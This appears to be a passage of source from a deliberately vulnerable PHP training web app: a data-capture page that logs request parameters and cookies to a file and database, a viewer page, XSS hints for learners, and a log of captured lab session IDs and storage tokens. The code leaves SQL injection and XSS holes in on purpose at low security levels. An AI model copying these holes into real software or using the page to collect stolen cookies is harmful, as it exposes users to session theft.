	}// end if	

	/* ------------------------------------------
 	* initialize log error handler
 	* ------------------------------------------ */
    require_once 'classes/LogHandler.php';
	if (!isset($LogHandler)){
		$LogHandler = 
		new LogHandler("owasp-esapi-php/src/", $_SESSION["security-level"]);
	}// end if	
    
	require_once 'classes/ClientInformationHandler.php';
	$lClientInformationHandler = new ClientInformationHandler();
	
	/* Grab as much information about visiting browser as possible. Most of this
	 * is available in the HTTP request header.
	 */
	$lClientHostname = $lClientInformationHandler->getClientHostname();
	$lClientIP = $lClientInformationHandler->getClientIP();
	$lClientUserAgentString = $lClientInformationHandler->getClientUserAgentString();
	$lClientReferrer = $lClientInformationHandler->getClientReferrer();
	$lClientPort = $lClientInformationHandler->getClientPort();
	
	if ($lProtectAgainstSQLInjection) {
		$lClientHostname = $conn->real_escape_string($lClientHostname);
		$lClientUserAgentString = $conn->real_escape_string($lClientUserAgentString);
		$lClientReferrer = $conn->real_escape_string($lClientReferrer);
	}// end if $lProtectAgainstSQLInjection	

	$lCapturedData = $conn->real_escape_string($lCapturedData);
	
	try {	    	
		switch ($_SESSION["security-level"]){
	   		case "0": // this code is insecure
	   		case "1": // this code is insecure 
				$lProtectAgainstSQLInjection = FALSE;
	   		break;//case "0"
	    		
	   		case "2":
	   		case "3":
	   		case "4":	
	   		case "5": // This code is fairly secure
				$lProtectAgainstSQLInjection = TRUE;
	   		break;//case "5"
	   	}// end switch ($_SESSION["security-level"])
		
	   	// Declare a temp varaible to hold our collected data
	   	$lCapturedData = "";
	   	
	   	// Capture GET and POST parameters
		foreach ( $_REQUEST as $k => $v ) {
			$lCapturedData .= "$k = $v" . PHP_EOL;
		}// end for each
	   	
		//Capture cookies
		foreach ( $_COOKIE as $k => $v ) {
			$lCapturedData .= "$k = $v" . PHP_EOL;
		}// end for each

		if ($lProtectAgainstSQLInjection) {
			$lClientHostname = $conn->real_escape_string($lClientHostname);
			$lCapturedData = $conn->real_escape_string($lCapturedData);
			$lClientUserAgentString = $conn->real_escape_string($lClientUserAgentString);
			$lClientReferrer = $conn->real_escape_string($lClientReferrer);
		}// end if $lProtectAgainstSQLInjection	
	
		$lQueryString = 
			"INSERT INTO captured_data(" . 
				"ip_address, hostname, port, user_agent_string, referrer, data, capture_date" . 
			") VALUES ('".
				$lClientIP . "', '".
				$lClientHostname . "', '".
				$lClientPort . "', '".
				$lClientUserAgentString . "', '".
				$lClientReferrer . "', '".
				$lCapturedData . "', ".
				" now()" .
			")";

		$result = $conn->query($lQueryString);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if
		
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, $lQueryString);
	}// end try		

	$lFilename = "captured-data.txt";
	try{
		$lmDateTime = new DateTime();
		$lCurrentDateTimeArray = getdate();
		$lCurrentDateTime = date('m-d-Y H:i:s', mktime($lCurrentDateTimeArray['hours'], $lCurrentDateTimeArray['minutes'], $lCurrentDateTimeArray['seconds'], $lCurrentDateTimeArray['mon'], $lCurrentDateTimeArray['mday'], $lCurrentDateTimeArray['year']));
		$lFileHandle = fopen($lFilename, "a");		
		fwrite($lFileHandle, PHP_EOL);
		fwrite($lFileHandle, "--------------------------------------------------".PHP_EOL);
		fwrite($lFileHandle, "Client IP: ".$lClientIP.PHP_EOL);
		fwrite($lFileHandle, "Timestamp: ".$lCurrentDateTime." GMT".PHP_EOL);
		fwrite($lFileHandle, "--------------------------------------------------".PHP_EOL);
		fwrite($lFileHandle, "Client Hostname: ".$lClientHostname.PHP_EOL);
		fwrite($lFileHandle, "Client User Agent: ".$lClientUserAgentString.PHP_EOL);
		fwrite($lFileHandle, "Client Referrer: ".$lClientReferrer.PHP_EOL);
		fwrite($lFileHandle, "Client Port: ".$lClientPort.PHP_EOL);
		fwrite($lFileHandle, "Captured Data: ".$lCapturedData);
		fwrite($lFileHandle, "--------------------------------------------------".PHP_EOL);
		fwrite($lFileHandle, PHP_EOL);
		fclose($lFileHandle);
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error trying to save captured data from capture.php into file " . $lFilename);
	}// end try
	
    /* ------------------------------------------
     * LOG USER VISIT TO PAGE
     * ------------------------------------------ */
	require_once ("log-visit.php");
    
    /* ------------------------------------------
     * CLOSE DATABASE CONNECTION
     * ------------------------------------------ */
    require_once 'closedb.inc';	
?>

<link rel="stylesheet" type="text/css" href="./styles/global-styles.css" />
<div class="page-title">Capture Data</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->

<table style="margin-left:auto; margin-right:auto; width: 600px;">
	<tr>
		<td class="form-header">Data Capture Page</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
			This page is designed to capture any parameters sent and store them in a file and a database table. It loops through
			the POST and GET parameters and records them to a file named <?php print $lFilename; ?>. On this system, the 
			file should be found at <?php print pathinfo($_SERVER["SCRIPT_FILENAME"], PATHINFO_DIRNAME) . "/" . $lFilename; ?>. The page
			also tries to store the captured data in a database table named captured_data. There is another page named
			<a href="index.php?page=captured-data.php">captured-data.php</a> that attempts to list the contents of this table.
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<th>
			The data captured on this request is: <?php print $lCapturedData; ?>
		</th>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td style="text-align:center;">
			Would it be possible to hack the hacker? Assume the hacker will view the captured requests with a web browser.
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>

<?php
	// Begin hints section
	if ($_SESSION["showhints"]) {
		echo '
			<div>&nbsp;</div>
			<div>&nbsp;</div>
			<table>
				<tr><td class="hint-header">Hints</td></tr>
				<tr>
					<td class="hint-body">
						<br/>
						<span class="report-header">Cross Site Scripting</span>
						<br/><br/>
						This page is the easiest in the site to inject XSS. The page reflects any input. This input
						could be from the Cookies, and URL query parameter, or any POSTed parameter.
						<br/><br/>
						<span class="report-header">Cross Site Scripting Via URL query parameters</span>
						<br/><br/>
						Try make up any URL query parameter and inject a script. In reality, just inject a script 
						as the variable. This page is very easy to inject. 
						<br/><br/>
						<span class="report-header">Cross Site Scripting Via POST parameters</span>
						<br/><br/>
						Use Burp-Suite to create POST parameters. Make one of the parameters a cross site script.
						<br/><br/>
						<span class="report-header">Cross Site Scripting Via Cookie</span>
						<br/><br/>
						Use Cookie Manager or Burp-Suite to create a cross site script. When this page
						prints the value of the cookie to the screen, the script will execute.
					</td>
				</tr>
			</table>'; 
	}//end if ($_SESSION["showhints"])

	if ($_SESSION["showhints"] == 2) {
		include_once './includes/cross-site-scripting-tutorial.inc';
	}// end if
?>

<?php
	/* Known Vulnerabilities
	 * Cross Site Scripting, Cross Site Scripting via HTTP Headers, 
	 * Denial of Service via Logging
	 */

	switch ($_SESSION["security-level"]){
   		case "0": // This code is insecure
   		case "1": // This code is insecure
   			// DO NOTHING: This is insecure		
			$lEncodeOutput = FALSE;
			$lLimitOutput= FALSE;
		break;
	    		
   		case "2":
   		case "3":
   		case "4":
   		case "5": // This code is fairly secure
  			/* 
  			 * NOTE: Input validation is excellent but not enough. The output must be
  			 * encoded per context. For example, if output is placed in HTML,
  			 * then HTML encode it. Blacklisting is a losing proposition. You 
  			 * cannot blacklist everything. The business requirements will usually
  			 * require allowing dangerous charaters. In the example here, we can 
  			 * validate username but we have to allow special characters in passwords
  			 * least we force weak passwords. We cannot validate the signature hardly 
  			 * at all. The business requirements for text fields will demand most
  			 * characters. Output encoding is the answer. Validate what you can, encode it
  			 * all.
  			 */
   			// encode the output following OWASP standards
   			// this will be HTML encoding because we are outputting data into HTML
			$lEncodeOutput = TRUE;
			
			/*
			 *  If DOS defenses are enabled, we limit output. An attacker can easily cause 
			 *  the logs to fill . This in itself may or may not pose a problem. 
			 *  But filling logs which display is a type of ampliphication attack. 
			 *  If one attacker puts 10,000 rows in the log then 10 innocent 
			 *  users view those logs, the system will have to display 100,000 log rows (10 users * 10,000 rows). 
			 *  Amplifications attacks are also done by sending single IP packets to networks 
			 *  which will broadcast the packet thus ampliphying the packet many times.
			 */
			$lLimitOutput= TRUE;
   		break;
   	}// end switch		

   	if(isset($_GET["deleteLogs"])){
		$query = "TRUNCATE TABLE captured_data";

		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if	
	}// end if isset
   	
?>

<div class="page-title">Captured Data</div>

<?php include_once './includes/back-button.inc';?>

<!-- BEGIN HTML OUTPUT  -->
<table style="margin-left:auto; margin-right:auto; width: 600px;">
	<tr>
		<td class="form-header">Captured Data Page</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
	<tr>
		<td>
			This page shows the data captured by page <a href="index.php?page=capture-data.php">capture-data.php</a>.
			There should also be a file with the same data since capture-data.php tries to save the data to a table
			and a file. The table contents are being displayed on this page. On this system, the 
			file should be found in <?php print pathinfo($_SERVER["SCRIPT_FILENAME"], PATHINFO_DIRNAME); ?>.
			The database table is named captured_data.
		</td>
	</tr>
	<tr><td>&nbsp;</td></tr>
</table>
<span title="Click to refresh captured data log" onclick="document.location.reload(true);" style="cursor: pointer;margin-right:35px;font-weight: bold;">
	<img width="32px" height="32px" src="./images/refresh-button-48px-by-48px.png" style="vertical-align:middle;" />
	Refresh
</span>
<span title="Click to delete captured data log. This deletes the database table only. The text file is not affected." onclick="document.location='./index.php?page=captured-data.php&deleteLogs=deleteLogs';" style="cursor: pointer;font-weight: bold;">
	<img width="32px" height="32px" src="./images/delete-icon-256-256.png" style="vertical-align:middle;" />
	Delete Capured Data
</span>
<br/>

<?php
	try{// to draw table
		$query = "SELECT ip_address, hostname, port, user_agent_string, referrer, data, capture_date 
				  FROM captured_data 
				  ORDER BY capture_date DESC";

		if ($lLimitOutput){
	    	$query .= " LIMIT 20";
	    }// end if
		
		$result = $conn->query($query);
		if (!$result) {
	    	throw (new Exception('Error executing query: '.$conn->error, $conn->errorno));
	    }// end if	

		// we have rows. Begin drawing output.
		echo '<table border="1px" width="100%" class="main-table-frame">';
		echo '<tr class="report-header"><td colspan="10">'.$result->num_rows.' captured records found</td></tr>';
	    echo '<tr class="report-header">
			    <td><b>Hostname</b></td>
			    <td><b>Client IP Address</b></td>
			    <td><b>Client Port</b></td>
    			<td><b>User Agent</b></td>
    			<td><b>Referrer</b></td>			    
			    <td><b>Data</b></td>
			    <td><b>Date/Time</b></td>
		    </tr>';

	    if ($lLimitOutput){
	    	echo '<tr><td class="error-header" colspan="10">Note: DOS defenses enabled. Rows limited to last 20.</td></tr>';
	    }// end if

	    $lRowNumber = 0;
	    while($row = $result->fetch_object()){
	    	$lRowNumber++;
			
			if(!$lEncodeOutput){
				$lHostname = $row->hostname;
				$lClientIPAddress = $row->ip_address;
				$lClientPort = $row->port;
				$lClientUserAgentString = $row->user_agent_string;
				$lClientReferrer = $row->referrer;				
				$lData = $row->data;
				$lCaptureDate = $row->capture_date;
			}else{
				$lHostname = $Encoder->encodeForHTML($row->hostname);
				$lClientIPAddress = $Encoder->encodeForHTML($row->ip_address);
				$lClientPort = $Encoder->encodeForHTML($row->port);
				$lClientUserAgentString = $Encoder->encodeForHTML($row->user_agent_string);
				$lClientReferrer = $Encoder->encodeForHTML($row->referrer);
				$lData = $Encoder->encodeForHTML($row->data);
				$lCaptureDate = $Encoder->encodeForHTML($row->capture_date);				
			}// end if
							
			echo "<tr>
					<td>{$lHostname}</td>
					<td>{$lClientIPAddress}</td>
					<td>{$lClientPort}</td>
					<td>{$lClientUserAgentString}</td>
					<td>{$lClientReferrer}</td>
					<td>{$lData}</td>
					<td>{$lCaptureDate}</td>
				</tr>\n";
		}//end while $row
		echo "</table>";
	} catch (Exception $e) {
		echo $CustomErrorHandler->FormatError($e, "Error writing rows.");
	}// end try;
?>

--------------------------------------------------
Client IP: 127.0.0.1 03-15-2012 19:56:52 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=captured-data.php
Client Port: 3370
Captured Data: page = capture-data.php
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-15-2012 19:57:59 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=captured-data.php
Client Port: 3400
Captured Data: page = capture-data.php
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-15-2012 20:07:23 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=dns-lookup.php
Client Port: 3597
Captured Data: html5storage = showhints=0; PHPSESSID=3jsuk08rp2copc4f4f86djoq56
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-15-2012 20:08:38 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 3698
Captured Data: html5storage = showhints=0; PHPSESSID=3jsuk08rp2copc4f4f86djoq56
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-15-2012 20:09:54 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=view-someones-blog.php
Client Port: 3834
Captured Data: html5storage = showhints=0; PHPSESSID=3jsuk08rp2copc4f4f86djoq56
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-15-2012 21:02:21 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 4558
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
showhints = 0
PHPSESSID = 3jsuk08rp2copc4f4f86djoq56
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:42:45 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 2300
Captured Data: html5storage = sessionStorage(CartSession):ABCDEFG; sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):This was set by a reflected cross site script;
showhints = 0
PHPSESSID = 6jgg4tg5ecb6s3v288v4n378i2
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:46:04 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 2353
Captured Data: html5storage = sessionStorage(CartSession):ABCDEFG; sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):This was set by persistent XSS;
showhints = 0
PHPSESSID = 6jgg4tg5ecb6s3v288v4n378i2
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:46:33 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=view-someones-blog.php
Client Port: 2417
Captured Data: html5storage = sessionStorage(CartSession):ABCDEFG; sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):This was set by persistent XSS;
showhints = 0
PHPSESSID = 6jgg4tg5ecb6s3v288v4n378i2
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:46:50 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=view-someones-blog.php
Client Port: 2451
Captured Data: html5storage = sessionStorage(CartSession):ABCDEFG; sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):This was set by persistent XSS;
showhints = 0
PHPSESSID = 6jgg4tg5ecb6s3v288v4n378i2
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:58:05 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=dns-lookup.php
Client Port: 2667
Captured Data: html5storage = PHPSESSID=b4dhgmp4893p3eko95hphnq274
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 15:58:43 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=dns-lookup.php
Client Port: 2688
Captured Data: html5storage = PHPSESSID=b4dhgmp4893p3eko95hphnq274
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 16:03:32 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=dns-lookup.php
Client Port: 2775
Captured Data: html5storage = sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 16:04:22 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=captured-data.php
Client Port: 2820
Captured Data: page = capture-data.php
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 16:12:59 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=captured-data.php
Client Port: 2905
Captured Data: page = capture-data.php
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 16:13:37 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 3040
Captured Data: html5storage = sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 03-16-2012 16:13:51 GMT
--------------------------------------------------
Client Hostname: localhost
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1
Client Referrer: http://localhost/mutillidae/index.php?page=view-someones-blog.php
Client Port: 3102
Captured Data: html5storage = sessionStorage(SessionStorageTarget):This is set by the index.php page; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = b4dhgmp4893p3eko95hphnq274
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:16:45 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/
Client Port: 44976
Captured Data: page = capture-data.php
showhints = 1
PHPSESSID = ak8qi1uo0kh80uu9udhblmlss5
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:17:00 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/index.php?page=capture-data.php
Client Port: 45025
Captured Data: page = capture-data.php
showhints = 0
PHPSESSID = ak8qi1uo0kh80uu9udhblmlss5
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:25:48 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/
Client Port: 59027
Captured Data: page = capture-data.php
showhints = 1
PHPSESSID = sa4sk02keh88g79ihfecmhqpt1
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:26:03 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/index.php?page=capture-data.php
Client Port: 59084
Captured Data: page = capture-data.php
showhints = 0
PHPSESSID = sa4sk02keh88g79ihfecmhqpt1
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:30:32 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Client Referrer: http://192.168.56.102/mutillidae/
Client Port: 36523
Captured Data: page = capture-data.php
PHPSESSID = 0lq7gar2irnjt7t2uk55s9taq0
showhints = 1
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 03:30:48 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)
Client Referrer: http://192.168.56.102/mutillidae/documentation/Mutillidae-Test-Scripts.txt
Client Port: 36633
Captured Data: PHPSESSID = 0lq7gar2irnjt7t2uk55s9taq0
showhints = 0
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 19:01:47 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/
Client Port: 47018
Captured Data: page = capture-data.php
showhints = 1
PHPSESSID = t22fbd12hfdpa91hrnrmvblr17
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-08-2012 19:02:07 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Wget/1.12 (linux-gnu)
Client Referrer: http://192.168.56.102/mutillidae/index.php?page=capture-data.php
Client Port: 47068
Captured Data: page = capture-data.php
showhints = 0
PHPSESSID = t22fbd12hfdpa91hrnrmvblr17
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:19:16 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36654
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:19:22 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36663
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:20:30 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36721
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:21:31 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36801
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:21:32 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36805
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:22:10 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36835
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:22:11 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36837
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:23:50 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36925
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:23:57 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 36934
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:27:46 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37013
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:27:51 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37022
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:28:59 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37080
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:30:07 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37154
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:30:08 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37156
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:30:42 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37186
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:30:43 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37188
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:32:27 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37284
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-27-2012 02:32:35 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 37293
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-28-2012 03:39:19 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 50815
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-28-2012 03:39:28 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 50824
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-28-2012 03:41:08 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 50879
Captured Data: page = capture-data.php
